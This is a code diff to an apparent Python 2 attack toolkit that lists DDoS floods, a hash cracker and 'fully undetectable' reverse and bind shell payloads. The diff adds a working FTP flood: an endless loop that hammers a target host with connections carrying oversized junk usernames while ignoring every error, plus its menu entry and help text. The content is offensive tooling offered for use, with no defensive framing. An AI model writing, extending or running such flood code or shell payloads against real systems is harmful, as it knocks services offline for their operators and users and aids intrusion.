@@ -13,7 +13,7 @@ except ImportError:
 	green=''
 	yellow=''
 	white=''
-scs = {'ddos':['flood/http','flood/tcp','flood/udp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc']} # SCRIPTS
+scs = {'ddos':['flood/http','flood/tcp','flood/udp','flood/ftp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc']} # SCRIPTS
 opt1 = ''
 opt2 = ''
 infos = {'flood/http': # Help for each script
@@ -21,7 +21,8 @@ infos = {'flood/http': # Help for each script
 	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/udp':
 	'Options:\nhost .... target to attack    '+opt1+'\n','offline/hashkiller':'Options:\nhash .... hash to crack    '+opt1+'\nwordlist .... wordlist to use    '+opt2,
 	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,'fud/python/bind_shell':'Options:\nhost .... host to bind    '+opt1+'\nport .... port to bind    '+opt2,
-	'windows/nc':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2
+	'windows/nc':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,
+	'flood/ftp':'Options:\nhost .... target to attack	'+opt1+'\nbytes .... bytes lenght to send on each connection	'+opt2
 }
 def options(script,_opt1,_opt2):
 	global opt1
@@ -129,6 +130,38 @@ def floodudp(host):
 			print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
 			s.close()
 			break
+def floodftp(host, lbytes):
+	from ftplib import FTP as connect
+	from ftplib import error_perm
+	import socket, sys, random
+	def flood(target, data):
+		while 1:
+			try:
+				sys.stdout.write('\r'+green+'[+] '+white+'Flooding with '+str(len(data))+' bytes' )
+				connect(target,data,word,timeout=0.1)
+			except error_perm:
+				pass
+			except socket.timeout:
+				pass
+			except socket.error:
+				pass
+			except MemoryError:
+				print('!> Memory error!')
+				pass
+			except KeyboardInterrupt:
+				break
+	def init():
+		try:
+			global word
+			word = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!')
+			size=int(lbytes)
+			data = word*size
+			flood(host, data)
+		except ValueError:
+			print('%s[!] %sBytes lenght must be a integer number!' %(yellow,white))
+		except MemoryError:
+			print('%s[!] %sBytes lenght is TOO LARGE!' %(yellow,white))
+	init()
 def hashkiller(wordl, hash):
 	import hashlib, sys
 	hashes = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
@@ -249,6 +282,8 @@ def run(script, opt1, opt2):
 		floodtcp(opt1,opt2)
 	if script == 'flood/udp':
 		floodudp(opt1)
+	if script == 'flood/ftp':
+		floodftp(opt1, opt2)
 	if script == 'offline/hashkiller':
 		if os.path.isfile(opt2):
 			hashkiller(opt2, opt1)
